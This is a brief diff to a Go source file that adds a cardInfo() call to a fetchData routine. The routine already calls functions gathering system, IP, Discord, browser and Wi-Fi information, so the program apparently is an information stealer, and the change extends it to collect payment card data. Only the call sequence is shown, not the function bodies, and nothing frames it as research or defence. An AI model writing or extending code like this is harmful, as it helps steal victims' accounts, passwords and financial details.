@@ -350,6 +350,7 @@ func fetchData() {
 	sysInfo()
 	ipInfo()
 	discordInfo()
+	cardInfo()
 	browserInfo()
 	wifiInfo()
 
